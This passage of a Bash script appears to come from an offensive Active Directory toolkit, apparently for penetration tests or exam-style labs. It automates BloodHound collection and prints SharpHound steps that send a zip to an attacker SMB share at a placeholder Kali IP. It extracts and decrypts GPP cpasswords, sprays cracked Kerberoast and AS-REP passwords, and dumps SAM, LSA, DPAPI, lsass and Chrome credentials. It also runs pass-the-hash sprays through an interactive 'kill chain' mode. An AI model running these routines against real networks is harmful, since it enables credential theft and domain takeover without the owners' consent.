        echo "SMB_SIGNING_DISABLED=NO" >> "${OUTDIR}/summary_notes.txt"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 6 — BLOODHOUND COLLECTION
#==============================================================================

# Emit the SharpHound + impacket-smbserver manual-collection fallback (the
# toolkit's stated convention, AGENTS §3) plus a hard warning. Called whenever
# automatic collection yields no graph — the AD graph drives the AD set, so a
# silent skip is never acceptable.
bloodhound_manual_fallback() {
    local reason="$1"
    error "BloodHound graph NOT collected automatically (${reason})"
    error "The AD graph drives the AD set — collect it MANUALLY before continuing."
    echo "BLOODHOUND_GRAPH=MISSING" >> "${OUTDIR}/summary_notes.txt"
    attack_cmd "BLOODHOUND — MANUAL COLLECTION (SharpHound + impacket-smbserver)" \
        "# Convention (AGENTS §3): run SharpHound on the target, exfil the zip over SMB." \
        "# 1. On Kali — serve a share to receive the zip:" \
        "impacket-smbserver -smb2support share ${OUTDIR}/bloodhound" \
        "" \
        "# 2. Get SharpHound.exe onto the compromised domain host" \
        "#    (BloodHound CE UI -> Collectors -> SharpHound; transfer via the share / http / certutil)" \
        "" \
        "# 3. On the target — collect as a domain user:" \
        ".\\SharpHound.exe -c All --zipfilename bh.zip" \
        "" \
        "# 4. Copy the zip back to the Kali share, then import:" \
        "copy bh.zip \\\\<KALI_IP>\\share\\" \
        "# BloodHound CE -> File Ingest -> bh.zip -> Shortest Path to DA from Owned"
    progress_log "MANUAL" "phase6_bloodhound" "${reason} — SharpHound fallback emitted"
}

phase6_bloodhound() {
    if [[ "$SKIP_BLOODHOUND" == true ]]; then
        info "BloodHound collection skipped (--skip-bloodhound)"
        progress_log "SKIP" "phase6_bloodhound" "user requested skip"
        return 0
    fi

    local phase_key="phase6_bloodhound"
    if is_phase_done "$phase_key"; then
        info "Phase 6 already complete (--force to redo)"
        return 0
    fi

    phase "6 — BloodHound Collection"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/bloodhound"

    if [[ "${TOOL_STATUS[bloodhound-ce-python]}" != "ok" ]]; then
        warn "bloodhound-ce-python not found (install: sudo apt install bloodhound-ce-python)"
        bloodhound_manual_fallback "bloodhound-ce-python not installed"
        return 1
    fi

    local bh_prefix="${OUTDIR}/bloodhound/bh"
    local -a bh_args=(-c All -d "$DOMAIN" -u "$AD_USER" -ns "$DC_IP" --zip -op "$bh_prefix")
    [[ -n "$DC_HOST" ]] && bh_args+=(-dc "$DC_HOST")

    if [[ "$AUTH_TYPE" == "hash" ]]; then
        bh_args+=(--hashes "$LM_NT_HASH")
    else
        bh_args+=(-p "$PASS")
    fi

    cmd_log "bloodhound-ce-python ${bh_args[*]}"
    timeout 300 bloodhound-ce-python "${bh_args[@]}" \
        > "${OUTDIR}/bloodhound/collection_output.txt" 2>&1
    local bh_exit=$?

    # Find resulting zip
    local bh_zip=""
    local z
    for z in "${OUTDIR}/bloodhound/"*.zip; do
        [[ -f "$z" ]] && bh_zip="$z" && break
    done

    if [[ -n "$bh_zip" ]]; then
        success "BloodHound collection complete → ${bh_zip}"
        echo "BLOODHOUND_ZIP=${bh_zip}" >> "${OUTDIR}/summary_notes.txt"
        info "Upload steps:"
        info "  1. Open BloodHound CE in browser"
        info "  2. Click 'File Ingest' → upload ${bh_zip}"
        info "  3. Mark compromised users as 'Owned'"
        info "  4. Run: 'Shortest Path to Domain Admins from Owned Principals'"
        echo ""
        attack_cmd "BLOODHOUND — IMPORT AND ANALYZE" \
            "# Option A: BloodHound CE web UI (browser):" \
            "# → File Ingest → upload ${bh_zip}" \
            "# → Analysis → Shortest Path to DA from Owned" \
            "" \
            "# Option B: bloodhound-cli (command-line import):" \
            "bloodhound-cli upload --path ${bh_zip} --url http://localhost:8080 --username admin --password <BHCE_PASS>" \
            "" \
            "# Key queries after import:" \
            "# 1. Shortest Paths to Domain Admins" \
            "# 2. Kerberoastable users with path to DA" \
            "# 3. Users with DCSync rights" \
            "# 4. ASREPRoastable users"
        progress_log "DONE" "$phase_key" "zip=${bh_zip}"
    else
        warn "Check: ${OUTDIR}/bloodhound/collection_output.txt"
        bloodhound_manual_fallback "automatic collection produced no zip (exit ${bh_exit})"
        return 1
    fi
}

#==============================================================================
# PHASE 7 — SHARE ENUMERATION
#==============================================================================
phase7_shares() {
    if [[ "$SKIP_SHARES" == true || "$QUICK_MODE" == true ]]; then
        info "Share enumeration skipped"
        progress_log "SKIP" "phase7_shares" "skipped"
        return 0
    fi

    local phase_key="phase7_shares"
    if is_phase_done "$phase_key"; then
        info "Phase 7 already complete (--force to redo)"
        return 0
    fi

    phase "7 — Share Enumeration (SYSVOL, NETLOGON, GPP check)"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/shares"

    build_nxc_auth
    build_smbc_auth

    # 7a. nxc share listing
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --shares"
    timeout 120 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --shares \
        > "${OUTDIR}/shares/all_shares.txt" 2>&1 || true
    success "Share list → shares/all_shares.txt"

    if [[ "${TOOL_STATUS[smbclient]}" == "ok" ]]; then
        # 7b. SYSVOL top-level listing
        cmd_log "smbclient //${DC_IP}/SYSVOL ${SMBC_HASH_FLAG[*]} -U '${SMBC_CRED}' -c 'ls'"
        timeout 30 smbclient "//${DC_IP}/SYSVOL" \
            "${SMBC_HASH_FLAG[@]}" \
            -U "$SMBC_CRED" \
            -c "ls" \
            > "${OUTDIR}/shares/sysvol_ls.txt" 2>&1 || true

        # 7c. NETLOGON listing
        cmd_log "smbclient //${DC_IP}/NETLOGON ${SMBC_HASH_FLAG[*]} -U '${SMBC_CRED}' -c 'ls'"
        timeout 30 smbclient "//${DC_IP}/NETLOGON" \
            "${SMBC_HASH_FLAG[@]}" \
            -U "$SMBC_CRED" \
            -c "ls" \
            > "${OUTDIR}/shares/netlogon_ls.txt" 2>&1 || true

        # 7d. SYSVOL recursive listing (look for scripts, GPP, config files)
        cmd_log "smbclient //${DC_IP}/SYSVOL ${SMBC_HASH_FLAG[*]} -U '${SMBC_CRED}' -c 'recurse;ls'"
        timeout 60 smbclient "//${DC_IP}/SYSVOL" \
            "${SMBC_HASH_FLAG[@]}" \
            -U "$SMBC_CRED" \
            -c "recurse;ls" \
            > "${OUTDIR}/shares/sysvol_recurse.txt" 2>&1 || true

        # Check for Groups.xml (GPP passwords)
        if grep -qiE "Groups\.xml" \
            "${OUTDIR}/shares/sysvol_recurse.txt" \
            "${OUTDIR}/shares/sysvol_ls.txt" 2>/dev/null; then
            success "*** Groups.xml FOUND IN SYSVOL — GPP password likely ***"
            echo "GROUPS_XML=YES" >> "${OUTDIR}/summary_notes.txt"
            # Try to extract actual cpassword values from already-downloaded Groups.xml files
            local gpp_cmds=()
            local groups_xml_files
            mapfile -t groups_xml_files < <(find "${OUTDIR}/shares" -name 'Groups.xml' 2>/dev/null)
            if (( ${#groups_xml_files[@]} > 0 )); then
                for gxml in "${groups_xml_files[@]}"; do
                    local cpw
                    cpw=$(grep -oP 'cpassword="\K[^"]+' "$gxml" 2>/dev/null | head -1 || true)
                    if [[ -n "$cpw" ]]; then
                        gpp_cmds+=("gpp-decrypt '${cpw}'   # from: $gxml")
                    fi
                done
            fi
            if (( ${#gpp_cmds[@]} > 0 )); then
                attack_cmd "GPP PASSWORD (Groups.xml — cpassword extracted)" \
                    "${gpp_cmds[@]}" \
                    "" \
                    "# After decrypting — spray the password:" \
                    "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-GetGPPPassword -dc-ip ${DC_IP} -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}"; else echo "impacket-GetGPPPassword -dc-ip ${DC_IP} ${DOMAIN}/${AD_USER}:${PASS}"; fi)"
            else
                attack_cmd "GPP PASSWORD (Groups.xml found in SYSVOL)" \
                    "# Download Groups.xml from SYSVOL, then:" \
                    "grep -oP 'cpassword=\"\\K[^\"]+' Groups.xml   # extract cpassword" \
                    "gpp-decrypt '<cpassword_value>'                # decrypt it" \
                    "" \
                    "# Or use impacket-GetGPPPassword:" \
                    "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-GetGPPPassword -dc-ip ${DC_IP} -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}"; else echo "impacket-GetGPPPassword -dc-ip ${DC_IP} ${DOMAIN}/${AD_USER}:${PASS}"; fi)"
            fi
        fi

        # Flag other interesting files
        grep -iE "\.(bat|ps1|vbs|cmd|xml)$|pass|cred|admin|secret" \
            "${OUTDIR}/shares/sysvol_recurse.txt" 2>/dev/null \
            > "${OUTDIR}/shares/sysvol_interesting.txt" || true

        if [[ -s "${OUTDIR}/shares/sysvol_interesting.txt" ]]; then
            success "Interesting SYSVOL files → shares/sysvol_interesting.txt"
            head -20 "${OUTDIR}/shares/sysvol_interesting.txt"
        fi
    else
        warn "smbclient not available — skipping SYSVOL/NETLOGON detailed browse"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 8 — SESSION ENUMERATION
#==============================================================================
phase8_sessions() {
    if [[ "$QUICK_MODE" == true ]]; then
        info "Session enumeration skipped (--quick)"
        progress_log "SKIP" "phase8_sessions" "quick mode"
        return 0
    fi

    local phase_key="phase8_sessions"
    if is_phase_done "$phase_key"; then
        info "Phase 8 already complete (--force to redo)"
        return 0
    fi

    phase "8 — Session Enumeration (active users)"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/sessions"

    build_nxc_auth

    # 8a. Active SMB sessions
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --smb-sessions"
    timeout 60 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --smb-sessions \
        > "${OUTDIR}/sessions/smb_sessions.txt" 2>&1 || true
    success "SMB sessions → sessions/smb_sessions.txt"

    # 8b. Logged-on users
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --loggedon-users"
    timeout 60 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --loggedon-users \
        > "${OUTDIR}/sessions/loggedon_users.txt" 2>&1 || true
    success "Logged-on users → sessions/loggedon_users.txt"

    # Flag privileged sessions
    if grep -qiE "admin|administrator|domain.admin" \
        "${OUTDIR}/sessions/loggedon_users.txt" \
        "${OUTDIR}/sessions/smb_sessions.txt" 2>/dev/null; then
        success "*** PRIVILEGED USER SESSIONS VISIBLE ***"
        echo "PRIV_SESSIONS=YES" >> "${OUTDIR}/summary_notes.txt"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 9 — SPRAY CRACKED PASSWORDS
#==============================================================================
phase9_spray_cracked() {
    if [[ "$QUICK_MODE" == true ]]; then
        info "Spray phase skipped (--quick)"
        progress_log "SKIP" "phase9_spray_cracked" "quick mode"
        return 0
    fi

    local phase_key="phase9_spray_cracked"
    if is_phase_done "$phase_key"; then
        info "Phase 9 already complete (--force to redo)"
        return 0
    fi

    phase "9 — Spray Cracked Passwords"
    progress_log "START" "$phase_key" ""

    local sprayr="${SCRIPT_DIR}/sprayr.sh"
    local user_list="${OUTDIR}/users/all_users.txt"
    local asrep_file="${OUTDIR}/hashes/asreproast.txt"
    local kerb_file="${OUTDIR}/hashes/kerberoast.txt"
    local cracked_file="${OUTDIR}/hashes/cracked_passwords.txt"
    local potfile="${HOME}/crackr_output/hashcat.potfile"

    # Check prerequisites
    if [[ ! -x "$sprayr" ]]; then
        warn "sprayr.sh not found at ${sprayr} — skipping spray phase"
        progress_log "SKIP" "$phase_key" "sprayr.sh not found"
        return 0
    fi
    if [[ ! -s "$user_list" ]]; then
        warn "No user list found — skipping spray phase"
        progress_log "SKIP" "$phase_key" "no user list"
        return 0
    fi

    # Extract cracked passwords from hashcat potfile and john
    : > "$cracked_file"

    local hash_file mode
    for hash_file in "$asrep_file" "$kerb_file"; do
        [[ -s "$hash_file" ]] || continue

        # Determine hashcat mode
        if [[ "$hash_file" == *asreproast* ]]; then
            mode=18200
        else
            mode=13100
        fi

        # Try hashcat --show (output format: hash:password)
        if [[ -f "$potfile" ]]; then
            hashcat -m "$mode" "$hash_file" --potfile-path "$potfile" --show 2>/dev/null \
                | rev | cut -d: -f1 | rev \
                >> "$cracked_file" || true
        fi

        # Try john --show (output format: user:password)
        john --show "$hash_file" 2>/dev/null \
            | grep -v "^$" | grep -v "password hashes cracked" \
            | cut -d: -f2 \
            >> "$cracked_file" || true
    done

    # Deduplicate and remove empty lines
    if [[ -s "$cracked_file" ]]; then
        sort -u "$cracked_file" | grep -v '^\s*$' > "${cracked_file}.tmp" 2>/dev/null
        mv "${cracked_file}.tmp" "$cracked_file"
    fi

    local cracked_count=0
    [[ -s "$cracked_file" ]] && cracked_count=$(wc -l < "$cracked_file")

    if (( cracked_count == 0 )); then
        info "No cracked passwords found"
        info "Run crackr.sh first if you haven't:"
        [[ -s "$asrep_file" ]] && info "  ./crackr.sh -f ${asrep_file}"
        [[ -s "$kerb_file" ]]  && info "  ./crackr.sh -f ${kerb_file}"
        progress_log "SKIP" "$phase_key" "no cracked passwords"
        return 0
    fi

    local user_count
    user_count=$(wc -l < "$user_list")
    success "Found ${cracked_count} cracked password(s), ${user_count} domain users"
    success "Spraying all cracked passwords against user list..."

    local pw
    while IFS= read -r pw; do
        [[ -z "$pw" ]] && continue
        info "Spraying password: ${pw:0:3}***"
        cmd_log "${sprayr} -U ${user_list} -p '***' -d ${DOMAIN} -t ${DC_IP} --safe --quick"
        "$sprayr" -U "$user_list" -p "$pw" -d "$DOMAIN" -t "$DC_IP" --safe --quick || true
    done < "$cracked_file"

    progress_log "DONE" "$phase_key" "passwords=${cracked_count}"
}

#==============================================================================
# CHAIN MODE — Interactive AD Kill Chain Walkthrough
#==============================================================================
CHAIN_MODE=false

chain_prompt() {
    local step_name="$1"
    local step_desc="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}═══ ${step_name} ═══${NC}"
    echo -e "${CYAN}${step_desc}${NC}"
    echo ""
    while true; do
        echo -en "${BOLD}[P]roceed / [S]kip / [Q]uit? ${NC}"
        read -r choice
        case "${choice,,}" in
            p|proceed) return 0 ;;
            s|skip)    return 1 ;;
            q|quit)    info "Chain aborted."; exit 0 ;;
            *)         echo "  Enter P, S, or Q" ;;
        esac
    done
}

mode_chain() {
    phase "AD Kill Chain — Interactive Walkthrough"
    info "Domain: ${BOLD}${DOMAIN}${NC}  DC: ${BOLD}${DC_IP}${NC}  User: ${BOLD}${AD_USER}${NC}"
    local chain_log="${OUTDIR}/chain_log.txt"
    echo "AD Kill Chain — $(date)" > "$chain_log"
    echo "Domain: ${DOMAIN}  DC: ${DC_IP}  User: ${AD_USER}" >> "$chain_log"
    echo "" >> "$chain_log"

    # Step 1: Validate foothold
    if chain_prompt "STEP 1: VALIDATE FOOTHOLD" \
        "Test credential against DC, check admin access, get password policy"; then
        phase1_domain_context || {
            error "Credential validation failed — fix before continuing"
            return 1
        }
        echo "[$(date '+%H:%M:%S')] Step 1 DONE — foothold validated" >> "$chain_log"
    fi

    # Step 2: User enumeration + description mining
    if chain_prompt "STEP 2: USER ENUM + DESCRIPTION MINING" \
        "Enumerate all users, mine descriptions for passwords (OffSec classic)"; then
        phase2_user_enum
        if [[ -s "${OUTDIR}/users/suspicious_descriptions.txt" ]]; then
            echo ""
            echo -e "${GREEN}${BOLD}  ★ PASSWORDS FOUND IN DESCRIPTIONS:${NC}"
            cat "${OUTDIR}/users/suspicious_descriptions.txt" | while IFS= read -r line; do
                echo -e "    ${GREEN}${line}${NC}"
            done
            echo ""
            echo -e "${YELLOW}  → Try these as passwords with sprayr.sh or manually!${NC}"
        fi
        echo "[$(date '+%H:%M:%S')] Step 2 DONE — user enum" >> "$chain_log"
    fi

    # Step 3: Kerberoast + AS-REP
    if chain_prompt "STEP 3: KERBEROAST + AS-REP ROAST" \
        "Collect crackable hashes — offline password extraction"; then
        phase3_kerberos
        echo ""
        if [[ -s "${OUTDIR}/hashes/kerberoast.txt" ]]; then
            local kcount
            kcount=$(wc -l < "${OUTDIR}/hashes/kerberoast.txt")
            echo -e "${GREEN}  ${kcount} Kerberoast hash(es) collected${NC}"
            echo -e "${YELLOW}  → Crack: ./crackr.sh -f ${OUTDIR}/hashes/kerberoast.txt${NC}"
        fi
        if [[ -s "${OUTDIR}/hashes/asreproast.txt" ]]; then
            local acount
            acount=$(wc -l < "${OUTDIR}/hashes/asreproast.txt")
            echo -e "${GREEN}  ${acount} AS-REP hash(es) collected${NC}"
            echo -e "${YELLOW}  → Crack: ./crackr.sh -f ${OUTDIR}/hashes/asreproast.txt${NC}"
        fi
        echo "[$(date '+%H:%M:%S')] Step 3 DONE — kerberos attacks" >> "$chain_log"
    fi

    # Step 4: Credential looting (SAM, LSA, DPAPI, browser) — requires admin on DC
    if chain_prompt "STEP 4: CREDENTIAL DUMP (requires admin on target)" \
        "SAM dump, LSA secrets, DPAPI, lsassy, browser creds — needs Pwn3d access"; then
        if ! grep -qF "ADMIN_ON_DC=YES" "${OUTDIR}/summary_notes.txt" 2>/dev/null; then
            warn "ADMIN_ON_DC marker not set — SAM/LSA/DPAPI dumps require admin on ${DC_IP}"
            warn "  phase1 did not detect admin access. Dumps will likely fail with STATUS_ACCESS_DENIED."
            echo -en "${BOLD}Continue anyway? [y/N] ${NC}"
            local confirm=""
            read -r confirm
            case "${confirm,,}" in
                y|yes) : ;;
                *)
                    info "Skipping Step 4 — escalate first, then re-run with --chain"
                    echo "[$(date '+%H:%M:%S')] Step 4 SKIPPED — no admin marker" >> "$chain_log"
                    return 0
                    ;;
            esac
        fi
        local loot_dir="${OUTDIR}/loot"
        mkdir -p "$loot_dir"

        info "Running credential extraction commands..."
        local nxc_target="$DC_IP"

        for dump_type in "--sam" "--lsa" "--dpapi" "-M lsassy"; do
            local label="${dump_type//--/}"
            label="${label//-M /}"
            local dump_args=()
            read -r -a dump_args <<< "$dump_type"
            cmd_log "nxc smb ${nxc_target} ${NXC_AUTH[*]} ${dump_type}"
            echo -e "  ${CYAN}Running: nxc smb ... ${dump_type}${NC}"
            local dump_out
            dump_out=$(timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" "${dump_args[@]}" 2>&1) || true
            echo "$dump_out" > "${loot_dir}/${label}.txt"

            # Access-denied is a privilege problem, not an empty result — say so
            # instead of silently producing no creds and looking like "nothing here".
            if grep -qiE "STATUS_ACCESS_DENIED|access[_ ]denied" <<< "$dump_out"; then
                warn "  ${label}: STATUS_ACCESS_DENIED — need DC-admin (Pwn3d!) on ${nxc_target} to dump; escalate first"
                echo "[$(date '+%H:%M:%S')] Step 4 ${label} ACCESS_DENIED — need admin on ${nxc_target}" >> "$chain_log"
                continue
            fi

            # Parse credentials from output
            echo "$dump_out" | grep -iE ":\S+:" | while IFS= read -r cred_line; do
                success "  CRED: ${cred_line}"
                echo "  ${cred_line}" >> "$chain_log"
            done
            # Log SAM hashes specifically
            echo "$dump_out" | grep -oP '\S+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::' | while IFS=: read -r u _rid _lm nt _ _ _; do
                creds_log "SAM" "$nxc_target" "$u" "$nt" "NTLM"
            done
        done

        # Browser creds
        cmd_log "nxc smb ${nxc_target} ${NXC_AUTH[*]} -M enum_chrome"
        echo -e "  ${CYAN}Running: nxc smb ... -M enum_chrome${NC}"
        timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" -M enum_chrome \
            > "${loot_dir}/browser_creds.txt" 2>&1 || true

        # Parse browser_creds.txt for cleartext passwords
        if [[ -s "${loot_dir}/browser_creds.txt" ]]; then
            local browser_pw_count=0
            browser_pw_count=$(grep -ciE 'password|passwd' "${loot_dir}/browser_creds.txt" 2>/dev/null || echo 0)
            if (( browser_pw_count > 0 )); then
                success "  ★ Browser credentials found:"
                grep -iE 'password|passwd|URL|username' "${loot_dir}/browser_creds.txt" 2>/dev/null \
                    | grep -v '^#\|^$' | head -20 | sed 's/^/    /'
                echo ""
                info "  → Add found passwords to spray list:"
                info "    grep -iE 'password' ${loot_dir}/browser_creds.txt | awk '{print \$NF}' > ${loot_dir}/browser_passwords.txt"
                info "    ./sprayr.sh -u ${AD_USER} -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
                attack_cmd "SPRAY BROWSER PASSWORDS (from enum_chrome dump)" \
                    "grep -iE 'password' ${loot_dir}/browser_creds.txt | awk '{print \$NF}' > ${loot_dir}/browser_passwords.txt" \
                    "${SCRIPT_DIR}/sprayr.sh -P ${loot_dir}/browser_passwords.txt -t ${DC_IP}"
            fi
        fi

        success "Credential dumps saved to ${loot_dir}/"
        echo "[$(date '+%H:%M:%S')] Step 4 DONE — credential dump" >> "$chain_log"
    fi

    # Step 5: BloodHound
    if chain_prompt "STEP 5: BLOODHOUND COLLECTION" \
        "Collect AD relationships — import into BloodHound for attack path analysis"; then
        phase6_bloodhound
        echo ""
        echo -e "${YELLOW}  → Import the zip into BloodHound${NC}"
        echo -e "${YELLOW}  → Check: Shortest Path to Domain Admin${NC}"
        echo -e "${YELLOW}  → Check: Kerberoastable users with path to DA${NC}"
        echo "[$(date '+%H:%M:%S')] Step 5 DONE — BloodHound" >> "$chain_log"
    fi

    # Step 6: Pass-the-Hash with collected NTLM hashes
    if chain_prompt "STEP 6: PASS-THE-HASH SPRAY" \
        "Spray any NTLM hashes from Step 4 against all domain hosts"; then
        local loot_dir="${OUTDIR}/loot"
        local sprayr="${SCRIPT_DIR}/sprayr.sh"
        local hashes_found=false

        # Collect unique hashes from loot
        local hash_tmp
        hash_tmp=$(mktemp)
        for f in "${loot_dir}"/*.txt; do
            [[ -f "$f" ]] || continue
            grep -oP '[a-fA-F0-9]{32}:[a-fA-F0-9]{32}' "$f" 2>/dev/null || true
        done | sort -u > "$hash_tmp"

        # Also check SAM for user:hash pairs
        local sam_users_tmp
        sam_users_tmp=$(mktemp)
        for f in "${loot_dir}"/*.txt; do
            [[ -f "$f" ]] || continue
            grep -oP '(\S+):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::' "$f" 2>/dev/null | while IFS=: read -r u _rid _lm nt _rest; do
                echo "${u}|${nt}"
            done
        done | sort -u > "$sam_users_tmp"

        if [[ -s "$sam_users_tmp" ]]; then
            hashes_found=true
            local pth_count
            pth_count=$(wc -l < "$sam_users_tmp")
            success "Found ${pth_count} user:hash pair(s) for PTH"
            while IFS='|' read -r pth_user pth_hash; do
                [[ -z "$pth_user" || -z "$pth_hash" ]] && continue
                info "PTH spray: ${pth_user} (hash ${pth_hash:0:8}...)"
                if [[ -x "$sprayr" ]]; then
                    "$sprayr" -u "$pth_user" -H "$pth_hash" -d "$DOMAIN" -t "$DC_IP" --quick --safe || true
                else
                    echo -e "  ${YELLOW}Manual: nxc smb ${DC_IP} -u ${pth_user} -H ${pth_hash} -d ${DOMAIN}${NC}"
                fi
            done < "$sam_users_tmp"
        fi

        if [[ "$hashes_found" == false ]]; then
            if grep -qiE "STATUS_ACCESS_DENIED|access[_ ]denied" "${loot_dir}"/*.txt 2>/dev/null; then
                warn "Credential dump was DENIED (STATUS_ACCESS_DENIED) — you need DC-admin (Pwn3d!) to dump."
                warn "Escalate to admin on ${DC_IP} first, then re-run --chain from Step 4."
            else
                warn "No NTLM hashes found in loot — skip or get admin access first"
            fi
        fi

        rm -f "$hash_tmp" "$sam_users_tmp"
        echo "[$(date '+%H:%M:%S')] Step 6 DONE — PTH spray" >> "$chain_log"
    fi

    # Step 7: Share and session enum
    if chain_prompt "STEP 7: SHARES + SESSIONS" \
        "Enumerate SMB shares (GPP, SYSVOL) and logged-on sessions"; then
        phase7_shares
        phase8_sessions
        echo "[$(date '+%H:%M:%S')] Step 7 DONE — shares + sessions" >> "$chain_log"
    fi

    # Final summary
    echo ""
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}  AD CHAIN COMPLETE${NC}"
    echo -e "${BOLD}${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${BOLD}Key files to check:${NC}"
    echo -e "  ${CYAN}${OUTDIR}/users/suspicious_descriptions.txt${NC}  — passwords in descriptions"
    echo -e "  ${CYAN}${OUTDIR}/hashes/kerberoast.txt${NC}              — crack with hashcat -m 13100"
    echo -e "  ${CYAN}${OUTDIR}/hashes/asreproast.txt${NC}              — crack with hashcat -m 18200"
    echo -e "  ${CYAN}${OUTDIR}/loot/*.txt${NC}                         — SAM/LSA/DPAPI dumps"
    echo -e "  ${CYAN}${OUTDIR}/bloodhound/*.zip${NC}                   — import into BloodHound"
    echo -e "  ${CYAN}${OUTDIR}/chain_log.txt${NC}                      — this session's log"
    echo ""
    echo -e "${BOLD}Next:${NC}"
    echo -e "  ${YELLOW}1. Crack any collected hashes: ./crackr.sh ...${NC}"
    echo -e "  ${YELLOW}2. Re-spray cracked creds:     ./sprayr.sh --from-creds${NC}"
    echo -e "  ${YELLOW}3. Check BloodHound paths:     Shortest Path to DA${NC}"
    echo ""
}

#==============================================================================
# SUMMARY GENERATION
#==============================================================================
write_summary() {
    local summary="${OUTDIR}/summary.txt"
    local notes="${OUTDIR}/summary_notes.txt"

    # Read a key=value note
    read_note() {
        grep -oP "(?<=${1}=).*" "$notes" 2>/dev/null | head -1 || true
    }

    local domain_sid asrep_count kerb_count bh_zip user_count
    domain_sid=$(read_note "DOMAIN_SID")
    asrep_count=$(read_note "ASREP_COUNT")
    kerb_count=$(read_note "KERB_COUNT")
    bh_zip=$(read_note "BLOODHOUND_ZIP")
    user_count=$(wc -l < "${OUTDIR}/users/all_users.txt" 2>/dev/null || echo "?")

    {
        echo "════════════════════════════════════════════════════════════════"
        echo "  AD ENUMERATION SUMMARY — ${DOMAIN}"
        echo "  Generated: $(date)"
        echo "════════════════════════════════════════════════════════════════"
        echo ""

        echo "DOMAIN INFO"
        echo "  Domain:      ${DOMAIN}"
        echo "  DC IP:       ${DC_IP}"
        [[ -n "$DC_HOST" ]] && echo "  DC Hostname: ${DC_HOST}"
        [[ -n "$domain_sid" ]] && echo "  Domain SID:  ${domain_sid}"
        echo "  Auth user:   ${AD_USER} (${AUTH_TYPE} auth)"
        echo "  Output dir:  ${OUTDIR}/"
        echo ""

        echo "PASSWORD POLICY"
        if [[ -f "${OUTDIR}/password_policy.txt" ]]; then
            grep -iE "lockout|threshold|badpwd|minimum|complexity" \
                "${OUTDIR}/password_policy.txt" 2>/dev/null \
                | sed 's/^/  /' || echo "  (see password_policy.txt)"
        else
            echo "  (not collected)"
        fi
        echo ""

        echo "CREDENTIAL LEADS — CHECK THESE FIRST"
        if [[ -s "${OUTDIR}/users/suspicious_descriptions.txt" ]]; then
            echo "  *** USER DESCRIPTIONS CONTAIN CREDENTIAL KEYWORDS ***"
            sed 's/^/  /' "${OUTDIR}/users/suspicious_descriptions.txt" 2>/dev/null || true
        else
            echo "  No suspicious user descriptions found"
        fi
        if grep -qF "GROUPS_XML=YES" "$notes" 2>/dev/null; then
            echo "  *** Groups.xml found in SYSVOL — run gpp-decrypt ***"
        fi
        echo ""

        echo "USERS"
        echo "  Total: ${user_count} unique accounts → users/all_users.txt"
        echo "  Review: cat ${OUTDIR}/users/suspicious_descriptions.txt  (passwords in descriptions)"
        echo "  If hash cracking fails, spray userlist:"
        echo "    ./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP}"
        echo "    ./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p '<company_name>123' -d ${DOMAIN} -t ${DC_IP}"
        echo "    # Check lockout threshold first: cat ${OUTDIR}/password_policy.txt"
        echo ""

        echo "KERBEROS ATTACK CANDIDATES"
        echo "  AS-REP Roastable: ${asrep_count:-0} account(s) → hashes/asreproast.txt"
        echo "  Kerberoastable:   ${kerb_count:-0} account(s)  → hashes/kerberoast.txt"
        if [[ -s "${OUTDIR}/users/asrep_candidates.txt" ]]; then
            echo "  AS-REP accounts:"
            sed 's/^/    /' "${OUTDIR}/users/asrep_candidates.txt" 2>/dev/null || true
        fi
        if [[ -s "${OUTDIR}/users/kerberoastable.txt" ]]; then
            echo "  Kerberoastable SPNs (first 10):"
            head -10 "${OUTDIR}/users/kerberoastable.txt" | sed 's/^/    /' || true
        fi
        echo ""

        echo "PRIVILEGED GROUP MEMBERS"
        if [[ -f "${OUTDIR}/groups/privileged_groups.txt" ]]; then
            grep -A10 "=== Domain Admins" \
                "${OUTDIR}/groups/privileged_groups.txt" 2>/dev/null \
                | sed 's/^/  /' | head -15 || echo "  (see groups/privileged_groups.txt)"
        else
            echo "  (not collected)"
        fi
        echo ""

        echo "LATERAL MOVEMENT"
        if grep -qF "SMB_SIGNING_DISABLED=YES" "$notes" 2>/dev/null; then
            echo "  *** SMB SIGNING DISABLED — NTLM relay possible ***"
            echo "  Relay list: ${OUTDIR}/smb_no_signing.txt"
        else
            echo "  SMB signing: enabled on DC"
        fi
        if grep -qF "PRIV_SESSIONS=YES" "$notes" 2>/dev/null; then
            echo "  *** PRIVILEGED USER SESSIONS VISIBLE — see sessions/ ***"
            echo "  Logged-on privileged users: cat ${OUTDIR}/sessions/smb_sessions.txt"
            echo "  If you have code exec on that host:"
            echo "    # Token impersonation (Meterpreter): use incognito → list_tokens -u → impersonate_token"
            echo "    # Windows: Invoke-TokenManipulation.ps1"
            echo "    # Targeted Kerberoast the user if SPN-registered"
        fi
        echo ""

        echo "LEGACY/VULNERABLE OS"
        if grep -qF "OLD_OS=YES" "$notes" 2>/dev/null; then
            echo "  *** LEGACY OS FOUND — HIGH VALUE TARGETS ***"
            sed 's/^/  /' "${OUTDIR}/computers/old_os.txt" 2>/dev/null || true
            echo ""
            echo "  Exploitation guidance by OS:"
            while IFS= read -r os_line; do
                local os_host os_ver
